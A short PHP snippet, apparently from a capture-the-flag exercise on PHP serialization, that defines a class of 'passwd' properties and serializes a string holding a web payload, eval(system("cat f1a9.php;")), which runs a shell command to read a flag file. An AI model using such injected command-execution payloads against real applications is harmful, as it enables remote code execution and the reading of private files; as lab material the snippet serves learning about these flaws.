<?php
class FileClass
{
    private $a = 'passwd';
    protected $b = 'passwd';
    public $c = 'passwd';

}
# 参数可控

$a='<?php eval(system("cat f1a9.php;")); ?>';
echo serialize($a);
?>